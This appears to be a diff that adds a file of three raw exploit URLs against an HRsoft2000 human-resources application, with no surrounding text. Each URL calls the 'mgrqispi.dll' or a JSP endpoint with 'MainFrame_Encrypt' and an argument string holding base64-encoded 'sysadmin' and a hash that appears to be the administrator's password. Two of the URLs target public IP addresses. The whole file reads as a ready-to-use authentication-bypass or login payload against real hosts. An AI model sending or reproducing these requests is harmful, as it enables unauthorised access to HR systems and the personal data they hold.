@@ -1,0 +1,5 @@
+http://192.35.3.9:88/interface/data/GLeHRcf.jsp?Appname=HRsoft2000&Prgname=MainFrame_Encrypt&safe=weaver
+
+https://218.93.112.91:4433/web/1/http/1/192.35.3.2/scripts/mgrqispi.dll?Appname=HRsoft2000&Prgname=MainFrame_Encrypt&ARGUMENTS=-Ac3lzYWRtaW4=,-A4AF95A1318128EAAD49AB1557738A66D
+
+http://127.0.0.1/scripts/mgrqispi.dll?Appname=HRsoft2000&Prgname=MainFrame_Encrypt&ARGUMENTS=-Ac3lzYWRtaW4,-AA4AF95A1318128EAAD49AB1557738A66D
